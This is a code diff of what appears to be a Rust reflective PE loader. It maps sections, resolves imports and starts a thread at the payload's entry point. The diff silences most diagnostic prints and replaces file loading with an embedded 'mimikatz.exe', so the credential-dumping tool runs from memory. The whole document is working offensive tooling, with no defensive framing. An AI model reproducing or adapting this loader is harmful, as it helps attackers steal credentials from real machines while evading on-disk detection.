@@ -100,7 +100,7 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
                 .unwrap()
                 .trim_matches(char::from(0));
 
-            println!("[+] Copying section: {} to memory", name);
+            // println!("[+] Copying section: {} to memory", name);
 
             copy_nonoverlapping(
                 BUFFER
@@ -156,10 +156,10 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
         while (*imp_desc).Name != 0 {
             let dll_name = (image_base as usize + (*imp_desc).Name as usize) as *const i8;
 
-            println!(
-                "[+] Loading DLL: {}",
-                std::ffi::CStr::from_ptr(dll_name).to_str().unwrap()
-            );
+            // println!(
+            //     "[+] Loading DLL: {}",
+            //     std::ffi::CStr::from_ptr(dll_name).to_str().unwrap()
+            // );
 
             let h_module = LoadLibraryA(dll_name as *const u8);
 
@@ -187,10 +187,10 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
                     if let Some(func) = GetProcAddress(h_module, ordinal as *const u8) {
                         pfunc = func as u64;
                     }
-                    println!(
-                        "    [+] Resolving function by ordinal: {} at address {:X}",
-                        ordinal, pfunc
-                    );
+                    // println!(
+                    //     "    [+] Resolving function by ordinal: {} at address {:X}",
+                    //     ordinal, pfunc
+                    // );
                 } else {
                     let imp_by_name = (image_base as usize + (*paddr).u1.AddressOfData as usize)
                         as *const IMAGE_IMPORT_BY_NAME;
@@ -201,10 +201,10 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
                     if let Some(func) = GetProcAddress(h_module, func_name.as_ptr() as *const u8) {
                         pfunc = func as u64;
                     }
-                    println!(
-                        "    [+] Resolving function by name: {} at address {:X}",
-                        func_name, pfunc
-                    );
+                    // println!(
+                    //     "    [+] Resolving function by name: {} at address {:X}",
+                    //     func_name, pfunc
+                    // );
                 }
 
                 (*paddr).u1.Function = pfunc;
@@ -264,6 +264,7 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
 
         WaitForSingleObject(thread_handle, 1000);
 
+        println!("[+] Resuming thread at entry point: 0x{:x}", ctx.Rip);
         ResumeThread(thread_handle);
     }
 
@@ -271,26 +272,30 @@ unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
 }
 
 fn main() {
-    let args: Vec<String> = std::env::args().collect();
+    // let args: Vec<String> = std::env::args().collect();
 
-    if args.len() < 2 {
-        println!("[+] Usage: {} proc.enc <arguments>", args[0]);
-        exit(0);
-    }
+    // if args.len() < 2 {
+    //     println!("[+] Usage: {} proc.enc <arguments>", args[0]);
+    //     exit(0);
+    // }
 
-    let mut proc_args: Vec<String> = Vec::new();
+    // let mut proc_args: Vec<String> = Vec::new();
 
-    if args.len() > 2 {
-        proc_args = args[2..].to_vec();
-    }
+    // if args.len() > 2 {
+    //     proc_args = args[2..].to_vec();
+    // }
 
-    let path = args[1].clone();
+    // let path = args[1].clone();
 
-    println!("[+] Executing: {} with arguments {:?}", path, proc_args);
+    // println!("[+] Executing: {} with arguments {:?}", path, proc_args);
 
-    let mut file = File::open(path).expect("Failed to open file");
-    let mut buffer = Vec::new();
-    file.read_to_end(&mut buffer).expect("Failed to read file");
+    // let mut file = File::open(path).expect("Failed to open file");
+    // let mut buffer = Vec::new();
+    // file.read_to_end(&mut buffer).expect("Failed to read file");
+
+    // BUFFER.set(buffer).expect("Failed to set buffer");
+
+    let buffer = include_bytes!("../mimikatz.exe").to_vec();
 
     BUFFER.set(buffer).expect("Failed to set buffer");
 
